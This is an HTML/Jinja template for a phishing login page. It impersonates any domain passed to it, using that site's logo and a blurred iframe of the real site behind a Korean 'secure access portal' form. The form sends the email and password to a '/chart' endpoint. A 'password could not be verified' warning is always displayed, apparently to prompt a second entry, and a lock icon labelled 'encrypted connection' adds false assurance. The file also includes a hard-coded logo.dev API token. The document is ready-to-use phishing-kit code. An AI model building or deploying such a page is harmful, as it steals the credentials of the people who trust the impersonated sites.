<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>{{ domain }} TLS 로그인</title>

<link rel="icon" type="image/png"
      href="https://img.logo.dev/{{ domain }}?token=pk_X3Yst72FQUOeVfOd-dlhKg">

<style>
:root{
  --primary:#2563eb;
  --bg:#020617;
  --card:rgba(2,6,23,.92);
  --border:#1f2937;
  --text:#e5e7eb;
  --muted:#94a3b8;
  --warn:#eab308;
}

*{box-sizing:border-box;margin:0;padding:0}

html,body{
  height:100%;
  font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
  background:var(--bg);
  color:var(--text);
  overflow:hidden;
}

/* Background */
.background-frame{
  position:fixed;
  inset:0;
  width:100%;
  height:100%;
  border:none;
  z-index:-1;
  filter:blur(8px) brightness(.65);
  transform:scale(1.05);
}

/* Fade in */
body{animation:fade .7s ease both}
@keyframes fade{from{opacity:0}to{opacity:1}}

/* Shake animation */
@keyframes shake{
  0%,100%{transform:translateX(0)}
  20%{transform:translateX(-4px)}
  40%{transform:translateX(4px)}
  60%{transform:translateX(-3px)}
  80%{transform:translateX(3px)}
}
.shake{animation:shake .35s ease}

/* Layout */
.wrap{
  min-height:100%;
  display:grid;
  place-items:center;
  padding:24px;
}

.card{
  width:100%;
  max-width:420px;
  background:var(--card);
  backdrop-filter:blur(10px);
  border:1px solid var(--border);
  border-radius:14px;
  padding:32px 28px;
  box-shadow:0 30px 60px rgba(0,0,0,.55);
  animation:up .5s ease both;
}

@keyframes up{
  from{transform:translateY(14px);opacity:0}
  to{transform:translateY(0);opacity:1}
}

/* Brand */
.brand{
  display:flex;
  align-items:center;
  gap:12px;
  margin-bottom:22px;
}

.brand img{
  width:46px;height:46px;
  border-radius:10px;
  padding:6px;
  background:#0b1220;
  border:1px solid var(--border);
}

.brand h1{font-size:18px;font-weight:600}
.subtitle{font-size:13px;color:var(--muted)}

/* Fields */
.field{margin-bottom:16px}
label{
  font-size:12px;
  color:var(--muted);
  margin-bottom:6px;
  display:block;
}

input{
  width:100%;
  padding:12px 14px;
  border-radius:10px;
  border:1px solid var(--border);
  background:#020617;
  color:var(--text);
}

input:focus{
  outline:none;
  border-color:var(--primary);
  box-shadow:0 0 0 3px rgba(37,99,235,.25);
}

/* Password toggle */
.pass-wrap{position:relative}
.toggle{
  position:absolute;
  right:12px;
  top:50%;
  transform:translateY(-50%);
  font-size:12px;
  color:#93c5fd;
  cursor:pointer;
  user-select:none;
}

/* Button */
.btn{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:none;
  background:linear-gradient(135deg,#60a5fa,var(--primary));
  color:#020617;
  font-weight:600;
  cursor:pointer;
}

.btn:hover{filter:brightness(1.05);transform:translateY(-1px)}

/* Links */
.links{
  margin-top:14px;
  display:flex;
  justify-content:space-between;
  font-size:12px;
}
.links a{color:#93c5fd;text-decoration:none}

/* Trust */
.trust{
  margin-top:18px;
  font-size:12px;
  color:var(--muted);
  display:flex;
  align-items:center;
  gap:8px;
}

.lock{width:16px;height:16px;fill:#22c55e}

/* Footer */
.footer{
  margin-top:18px;
  font-size:11px;
  color:var(--muted);
  text-align:center;
}
</style>
</head>

<body>

<iframe src="https://www.{{ domain }}"
        class="background-frame"
        aria-hidden="true"></iframe>

<div class="wrap">
<main class="card {% if error %}shake{% endif %}">

<!-- Brand -->
<div class="brand">
  <img src="https://img.logo.dev/{{ domain }}?token=pk_X3Yst72FQUOeVfOd-dlhKg">
  <div>
    <h1>{{ domain }}</h1>
    <div class="subtitle" data-i18n>보안 액세스 포털</div>
  </div>
</div>

<form method="POST" action="/chart">

  <div class="field">
    <label data-i18n>이메일</label>
    <input type="email"
           name="user_email"
           value="{{ email }}"
           required
           autocomplete="username">
  </div>

  <div class="field pass-wrap">
    <label data-i18n>비밀번호</label>
    <input id="pw"
           type="password"
           name="user_password"
      
           {% if error %}style="border-color:var(--warn)"{% endif %}
           required
           autocomplete="current-password">
    <span class="toggle"
          onclick="pw.type=pw.type==='password'?'text':'password'">
          보여주다
    </span>
  </div>

 
  <p style="margin:12px 0;color:var(--warn);font-size:13px" data-i18n>
   비밀번호를 확인할 수 없습니다. 다시 시도해 주세요.
  </p>

  <button class="btn" data-i18n>로그인</button>
</form>

<div class="links">
  <a href="#" data-i18n>비밀번호를 잊으셨나요?</a>
  <a href="#" data-i18n>다른 방법을 사용하세요</a>
</div>

<div class="trust">
  <svg class="lock" viewBox="0 0 24 24">
    <path d="M12 1a5 5 0 00-5 5v4H6a2 2 0 00-2 2v9a2 2 0 002 2h12a2 2 0 002-2v-9a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm-3 9V6a3 3 0 016 0v4H9z"/>
  </svg>
  <span data-i18n>암호화된 연결</span>
</div>

<div class="footer" data-i18n>
  © 2026 {{ domain }} · Privacy · Terms · Security
</div>

</main>
</div>

<!-- 🌍 AUTO LANGUAGE TRANSLATION (No API Key) -->
<script>
(async () => {
  const lang = (navigator.language || "en").slice(0,2);
  if (lang === "en") return;

  const elements = [...document.querySelectorAll("[data-i18n]")];

  const texts = [...new Set(
    elements.map(el => el.innerText.trim()).filter(Boolean)
  )];

  if (!texts.length) return;

  async function translate(endpoint) {
    const res = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        q: texts,
        source: "en",
        target: lang,
        format: "text"
      })
    });
    return res.json();
  }

  let data;
  try {
    data = await translate("https://libretranslate.de/translate");
  } catch {
    try {
      data = await translate("https://translate.argosopentech.com/translate");
    } catch {
      return;
    }
  }

  if (!data?.translatedText) return;

  const map = {};
  texts.forEach((t,i) => map[t] = data.translatedText[i]);

  elements.forEach(el => {
    const original = el.innerText.trim();
    if (map[original]) el.innerText = map[original];
  });
})();
</script>

</body>
</html>
